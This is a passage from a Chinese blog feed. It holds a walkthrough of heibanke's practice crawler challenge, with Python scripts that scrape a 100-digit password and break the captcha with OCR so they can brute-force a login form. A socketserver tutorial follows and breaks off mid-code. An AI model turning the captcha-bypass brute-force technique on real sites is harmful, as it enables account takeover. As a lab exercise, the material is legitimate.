</figure><p>页面提示”密码很长，是试不出来的，需要找出来”，看一下源代码，还是跟第二关第三关一样，提交username和password参数，服务器有对token值进行检测</p><p>但是还是没有关于密码的提示部分信息</p><p>怎么办呢，我们先试一下随便输入一个密码1，看看页面返回什么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>惊喜的发现提示来了，我们点击”在这里耐心找”访问到提示页面(PS：这个页面有点慢，需要耐心等待加载)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>仔细观察，会发现这里提示信息是给出了一共100位的密码，其中每一位的值，而且每一页显示的位数还会变化，所以这里要访问所有的页数获取每一位数和对应的值是行不通的，所以我们干脆就一直访问第一页，爬取每一位的位数和对应的值，直到爬取位数共有100为止</p><p>直接附上代码吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex03/'</span></span><br><span class="line">pass_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex03/'</span></span><br><span class="line">hint_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex03/pw_list/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    r = s.get(login_url)</span><br><span class="line">    login_token = getToken(r.text)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:login_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'xxx'</span>,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'xxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    login = s.post(url=login_url,data=login_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'这里是黑板客爬虫闯关的第四关'</span> <span class="keyword">in</span> login.text:</span><br><span class="line">        print(<span class="string">'login successfully'</span>)</span><br><span class="line">    pass_token = getToken(login.text)</span><br><span class="line">    <span class="keyword">return</span> pass_token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDict</span><span class="params">()</span>:</span></span><br><span class="line">    total_pos = []</span><br><span class="line">    passwordDict = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        hint = s.get(url=hint_url)</span><br><span class="line">        pos = re.findall(<span class="string">r'title="password_pos"&gt;(\d*)'</span>,hint.text)</span><br><span class="line">        value = re.findall(<span class="string">r'title="password_val"&gt;(\d*)'</span>,hint.text)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pos)):</span><br><span class="line">            <span class="keyword">if</span> pos[i] <span class="keyword">not</span> <span class="keyword">in</span> total_pos:</span><br><span class="line">                total_pos.append(pos[i])</span><br><span class="line">                passwordDict[pos[i]] = value[i]</span><br><span class="line">        <span class="keyword">if</span> len(total_pos) == <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(len(total_pos))</span><br><span class="line">            print(passwordDict)</span><br><span class="line">    <span class="keyword">return</span> passwordDict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">(dic)</span>:</span></span><br><span class="line">    passList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        passList.append(dic[str(i)])</span><br><span class="line">    password = <span class="string">''</span>.join(passList)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line">pass_token = login()</span><br><span class="line">passwordDict = getDict()</span><br><span class="line">print(passwordDict)</span><br><span class="line">password = getPassword(passwordDict)</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>一开始还是跟第三关一样，先获取登录页面的token值，然后登录，页面如果有返回”这里是黑板客爬虫闯关的第四关”的信息说明登录成功，登录成功再获取关卡页面的token值，接下来就获取位置数和对应的值，这里定义了一个列表total_pos用来存放总的位置数和一个字典 passwordDict用来存放位置数及其对应的值，然后不断的访问提示页面的第一页，通过re模块的findall方法匹配出pos和value列表，每次匹配完检查pos列表的每一个元素，如果不在total_pos中，则添加进total_pos中，并将‘pos[i]’:’value[i]’键值对添加进字典中，直到匹配出100位为止，此时就获得了每一位和对应的值，再从第一位开始从字典中取出value值，添加进passList列表中，最后将passList列表元素拼成一个长字符串，就是最后获得的密码</p><p>这里过程实在是很慢，总之看脸…脸好很快就爬到了100位</p><p>最后获得的字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwordDict = &#123;</span><br><span class="line">    <span class="string">'73'</span>: <span class="string">'8'</span>, <span class="string">'76'</span>: <span class="string">'6'</span>, <span class="string">'28'</span>: <span class="string">'5'</span>, <span class="string">'72'</span>: <span class="string">'1'</span>, <span class="string">'61'</span>: <span class="string">'4'</span>, <span class="string">'32'</span>: <span class="string">'3'</span>, <span class="string">'57'</span>: <span class="string">'6'</span>, <span class="string">'75'</span>: <span class="string">'3'</span>, <span class="string">'90'</span>: <span class="string">'0'</span>, <span class="string">'53'</span>: <span class="string">'7'</span>, <span class="string">'74'</span>: <span class="string">'1'</span>, <span class="string">'56'</span>: <span class="string">'2'</span>, <span class="string">'83'</span>: <span class="string">'1'</span>, <span class="string">'34'</span>: <span class="string">'9'</span>, <span class="string">'44'</span>: <span class="string">'4'</span>, <span class="string">'70'</span>: <span class="string">'6'</span>, <span class="string">'92'</span>: <span class="string">'4'</span>, <span class="string">'18'</span>: <span class="string">'5'</span>, <span class="string">'93'</span>: <span class="string">'8'</span>, <span class="string">'37'</span>: <span class="string">'8'</span>, <span class="string">'85'</span>: <span class="string">'3'</span>, <span class="string">'67'</span>: <span class="string">'8'</span>, <span class="string">'17'</span>: <span class="string">'3'</span>, <span class="string">'62'</span>: <span class="string">'3'</span>, <span class="string">'84'</span>: <span class="string">'6'</span>, <span class="string">'24'</span>: <span class="string">'5'</span>, <span class="string">'8'</span>: <span class="string">'8'</span>, <span class="string">'15'</span>: <span class="string">'3'</span>, <span class="string">'100'</span>: <span class="string">'2'</span>, <span class="string">'55'</span>: <span class="string">'3'</span>, <span class="string">'1'</span>: <span class="string">'3'</span>, <span class="string">'10'</span>: <span class="string">'7'</span>, <span class="string">'20'</span>: <span class="string">'7'</span>, <span class="string">'79'</span>: <span class="string">'3'</span>, <span class="string">'12'</span>: <span class="string">'4'</span>, <span class="string">'91'</span>: <span class="string">'6'</span>, <span class="string">'36'</span>: <span class="string">'4'</span>, <span class="string">'43'</span>: <span class="string">'6'</span>, <span class="string">'60'</span>: <span class="string">'8'</span>, <span class="string">'48'</span>: <span class="string">'0'</span>, <span class="string">'25'</span>: <span class="string">'0'</span>, <span class="string">'22'</span>: <span class="string">'8'</span>, <span class="string">'4'</span>: <span class="string">'1'</span>, <span class="string">'16'</span>: <span class="string">'5'</span>, <span class="string">'94'</span>: <span class="string">'9'</span>, <span class="string">'54'</span>: <span class="string">'4'</span>, <span class="string">'50'</span>: <span class="string">'9'</span>, <span class="string">'66'</span>: <span class="string">'4'</span>, <span class="string">'64'</span>: <span class="string">'1'</span>, <span class="string">'5'</span>: <span class="string">'8'</span>, <span class="string">'47'</span>: <span class="string">'9'</span>, <span class="string">'51'</span>: <span class="string">'4'</span>, <span class="string">'80'</span>: <span class="string">'4'</span>, <span class="string">'69'</span>: <span class="string">'7'</span>, <span class="string">'71'</span>: <span class="string">'6'</span>, <span class="string">'7'</span>: <span class="string">'0'</span>, <span class="string">'96'</span>: <span class="string">'3'</span>, <span class="string">'46'</span>: <span class="string">'9'</span>, <span class="string">'2'</span>: <span class="string">'3'</span>, <span class="string">'27'</span>: <span class="string">'9'</span>, <span class="string">'49'</span>: <span class="string">'3'</span>, <span class="string">'13'</span>: <span class="string">'5'</span>, <span class="string">'99'</span>: <span class="string">'0'</span>, <span class="string">'89'</span>: <span class="string">'7'</span>, <span class="string">'39'</span>: <span class="string">'4'</span>, <span class="string">'26'</span>: <span class="string">'6'</span>, <span class="string">'63'</span>: <span class="string">'7'</span>, <span class="string">'29'</span>: <span class="string">'2'</span>, <span class="string">'52'</span>: <span class="string">'8'</span>, <span class="string">'65'</span>: <span class="string">'3'</span>, <span class="string">'33'</span>: <span class="string">'2'</span>, <span class="string">'30'</span>: <span class="string">'4'</span>, <span class="string">'9'</span>: <span class="string">'6'</span>, <span class="string">'86'</span>: <span class="string">'2'</span>, <span class="string">'19'</span>: <span class="string">'7'</span>, <span class="string">'38'</span>: <span class="string">'9'</span>, <span class="string">'40'</span>: <span class="string">'6'</span>, <span class="string">'98'</span>: <span class="string">'7'</span>, <span class="string">'77'</span>: <span class="string">'9'</span>, <span class="string">'59'</span>: <span class="string">'4'</span>, <span class="string">'41'</span>: <span class="string">'1'</span>, <span class="string">'42'</span>: <span class="string">'3'</span>, <span class="string">'21'</span>: <span class="string">'4'</span>, <span class="string">'45'</span>: <span class="string">'7'</span>, <span class="string">'58'</span>: <span class="string">'0'</span>, <span class="string">'6'</span>: <span class="string">'3'</span>, <span class="string">'81'</span>: <span class="string">'4'</span>, <span class="string">'23'</span>: <span class="string">'9'</span>, <span class="string">'3'</span>: <span class="string">'8'</span>, <span class="string">'11'</span>: <span class="string">'4'</span>, <span class="string">'97'</span>: <span class="string">'6'</span>, <span class="string">'82'</span>: <span class="string">'9'</span>, <span class="string">'14'</span>: <span class="string">'1'</span>, <span class="string">'87'</span>: <span class="string">'6'</span>, <span class="string">'78'</span>: <span class="string">'6'</span>, <span class="string">'31'</span>: <span class="string">'4'</span>, <span class="string">'95'</span>: <span class="string">'9'</span>, <span class="string">'68'</span>: <span class="string">'7'</span>, <span class="string">'88'</span>: <span class="string">'4'</span>, <span class="string">'35'</span>: <span class="string">'5'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>整理后的密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password = <span class="number">3381830867445135357748950695244329548946136479903948743260484371348776618136963449163264706489936702</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>第五关的url依旧要靠猜</p><h2 id="Pass-5"><a href="#Pass-5" class="headerlink" title="Pass-5"></a>Pass-5</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex04/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex04/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>依然要登录，很明显这关要提交验证码，观察一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以发现这个验证码其实是一个url，点击进去能看到验证码的图片，跟token一样，每次刷新页面，验证码的url都会变化，因此验证码就会一直变化</p><p>所以，我们要通这最后一关，就必须要想办法获取这个验证码的值</p><p>在Python中，有一个库叫pytesseract，这个库里的image_to_string方法具有识别图片中信息的功能</p><p>由于这个库跟requests一样，是第三方库，因此我们需要先安装后才能使用</p><p>除了pytesseract库之外，我们还依赖PIL库的Image方法打开一个图片</p><p>安装这两个库都可以用pip命令安装</p><p>比较关键的是pytesseract库识别验证码还依赖于一个插件Tesseract-OCR ，这个插件我们可以百度搜索tesseract-ocr-setup-3.02.02.exe 下载，这里我使用的是3.02版本，没有碰到什么问题，按照安装提示一步步下载下来，唯一要注意的是要按照默认路径下载，Windows的默认安装路径是C:\Program Files (x86)\Tesseract-OCR\ </p><p>这是因为我们下载完后需要在Python文件夹的下的\Lib\site-packages\pytesseract\pytesseract.py修改源代码中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tesseract_cmd = <span class="string">'tesseract'</span></span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tesseract_cmd = <span class="string">r'C:\Program Files (x86)\Tesseract-OCR\tesseract.exe'</span></span><br></pre></td></tr></table></figure><p>安装完成后，我们就可以获取验证码了，除了验证码外，我们还要获取三个值：登录界面的token值，关卡界面的token值，关卡界面的captcha_1 值</p><p>需要注意的是，我们用pytesseract库虽然可以识别验证码，但并不是百分百正确，所以我们需要对验证码进行校验，经过观察本关的验证码都是四个大小写英文字母，我们可以通过正则匹配进行校验，如果校验失败，则继续识别，直到校验成功，则提交猜测的密码，这里密码从0开始递增猜测</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex04/'</span></span><br><span class="line">pass_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex04/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCaptcha_0</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    Captcha_0 = soup.find(<span class="string">'input'</span>,id=<span class="string">"id_captcha_0"</span>)[<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> Captcha_0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    r = s.get(url=login_url)</span><br><span class="line">    login_token = getToken(r.text)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:login_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'xxx'</span>,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'xxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    login = s.post(url=login_url,data=login_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'这里是黑板客爬虫闯关的第五关'</span> <span class="keyword">in</span> login.text:</span><br><span class="line">        print(<span class="string">'login successfully!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getImageURL</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    imageURL = <span class="string">'http://www.heibanke.com'</span>+soup.find(<span class="string">'img'</span>,class_=<span class="string">'captcha'</span>)[<span class="string">'src'</span>]</span><br><span class="line">    <span class="keyword">return</span> imageURL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getImageCode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">'--------------------开始识别验证码'</span>)</span><br><span class="line">        pas = s.get(url=pass_url)</span><br><span class="line">        imageURL = getImageURL(pas.text)</span><br><span class="line">        image = s.get(url=imageURL)</span><br><span class="line">        captcha_img = Image.open(BytesIO(image.content))</span><br><span class="line">        imageCode = pytesseract.image_to_string(captcha_img)</span><br><span class="line">        print(<span class="string">'验证码识别结果:'</span>,imageCode)</span><br><span class="line">        print(<span class="string">'--------------------开始校验验证码'</span>)</span><br><span class="line">        match = re.search(<span class="string">r'^[A-Z | a-z]&#123;4&#125;$'</span>,imageCode)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验结果识别失败，继续识别'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验成功'</span>)</span><br><span class="line">            mess = (imageCode,pas)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">'--------------------------------------开始猜测密码'</span>)</span><br><span class="line">        imageCode,pas = getImageCode()</span><br><span class="line">        pas_token = getToken(pas.text)</span><br><span class="line">        Captcha_0 = getCaptcha_0(pas.text)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'csrfmiddlewaretoken'</span>:pas_token,</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'aaa'</span>,</span><br><span class="line">            <span class="string">'password'</span>:password,</span><br><span class="line">            <span class="string">'captcha_0'</span>:Captcha_0,</span><br><span class="line">            <span class="string">'captcha_1'</span>:imageCode</span><br><span class="line">            &#125;</span><br><span class="line">        g = s.post(url=pass_url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'验证码输入错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(<span class="string">'验证码输入错误'</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'您输入的密码错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(<span class="string">'密码:'</span>,password,<span class="string">'错误'</span>)</span><br><span class="line">            password +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            print(<span class="string">'密码:'</span>,password,<span class="string">'正确'</span>)</span><br><span class="line">            print(<span class="string">'返回的页面结果:'</span>)</span><br><span class="line">            print(g.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">login()</span><br><span class="line">guess()</span><br></pre></td></tr></table></figure><p>这关坑还是很多的，主要是识别校验码的正确率有点低，即使校验结果是四个英文字母，也不一定是正确的验证码，而且密码是随着时间变化的，总之耐心尝试吧，有了思路多尝试最后总是能成功的</p><p>最后我的时间段检测到的正确密码：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器提交密码19</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后附上参考的链接：<a href="https://www.jianshu.com/p/f64853b8f7e9" target="_blank" rel="noopener">https://www.jianshu.com/p/f64853b8f7e9</a></p>]]></content>
    
    <summary type="html">
    
      Python爬虫
    
    </summary>
    
      <category term="Python爬虫" scheme="https://Foxgrin.github.io/categories/Python%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python网络编程(二)</title>
    <link href="https://Foxgrin.github.io//posts/24856/"/>
    <id>https://Foxgrin.github.io//posts/24856/</id>
    <published>2018-07-24T14:39:00.000Z</published>
    <updated>2018-07-25T01:58:14.254Z</updated>
    
    <content type="html"><![CDATA[<p>在上篇文章中，我们了解了Python网络编程的基础模块socket，并利用threading模块实现了多线程处理以及模拟了代理的过程，这篇文章了解一下Python中更为实用，功能更加强大的socketserver模块，用法也更为简单，同时我们也试着实现模拟burp抓取http头部<a id="more"></a></p><h2 id="socketserver库"><a href="#socketserver库" class="headerlink" title="socketserver库"></a>socketserver库</h2><p>python 3是将python 2中的SocketServer库的大写取消，即socketserver库</p><p>首先介绍一下socketserver库的五个重要的类：</p><p>1.BaseServe：这个类是模块里最基本的类，所有的类源头都来至于这个基类，但是他不是用于实例或使用的</p><p>2.TCPServer：这个类用于TCP/ip的socket通讯</p><p>3.UDPServer：这个类用于UDP的socket通讯</p><p>4.UnixStreamServer </p><p>5.UnixDatagramServer :使用的Unix - domain sockets通讯，并且只能Unix平台使用</p><p>可能看不太懂，无所谓，我们只需要关心它的基本使用方法即可</p><p>(1)首先我们先导入socketserver库，这个就不用多说了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br></pre></td></tr></table></figure><p>(2)然后我们需要自定义一个类，用这个类来继承socketserver库中的BaseRequestHandler类，然后重写BaseRequestHandler类中的handle方法，其实就是自定义我们通讯的接收与发送过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTCPServer</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">            self.data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            print(bytes.decode(self.data))</span><br><span class="line">            self.reply = input(<span class="string">'reply: '</span>)</span><br><span class="line">            self.request.sendall(str.encode(self.reply))</span><br></pre></td></tr></table></figure><p>这里的self.request.recv()和self.request.sendall()其实就相当于我们socket模块中的recv和send方法</p><p>(3)接下来我们在主函数中使用socketserver的ThreadingTCPServer方法实例化一个对象server，传入元组(ip,端口)和我们定义的继承类，然后使用serve_forever()来启动服务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    server = socketserver.ThreadingTCPServer((<span class="string">''</span>,<span class="number">6666</span>),MyTCPServer)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>可以看出，对比与socket库，我们简化了初始socket，绑定端口ip，开始监听的过程，只需要去规定发送与接收信息的流程，并且支持多线程，短短几行代码就可以实现我们之前通过复杂的代码实现的效果</p><p>下面附上一个简单的Server端和Client端的实例：</p><p>Server端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTCPServer</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Connected By'</span>,self.client_address)</span><br><span class="line">        self.request.send(str.encode(<span class="string">'Welcome to TCPServer!'</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            self.data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">            self.data = bytes.decode(self.data)</span><br><span class="line">            <span class="keyword">if</span>(self.data == <span class="string">'exit'</span>):</span><br><span class="line">                print(<span class="string">'Client'</span>,self.client_address,<span class="string">'has lost'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">'The data from'</span>,self.client_address,<span class="string">'is'</span>,self.data)</span><br><span class="line">            self.reply = input(<span class="string">'reply to client: '</span>)</span><br><span class="line">            self.request.send(str.encode(self.reply))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    HOST = <span class="string">'localhost'</span></span><br><span class="line">    PORT = <span class="number">6666</span></span><br><span class="line">    server = socketserver.ThreadingTCPServer((HOST,PORT),MyTCPServer)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>Client端：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">c.connect((<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>))</span><br><span class="line">message = c.recv(<span class="number">1024</span>)</span><br><span class="line">print(bytes.decode(message))</span><br><span class="line"><span class="keyword">while</span> <span 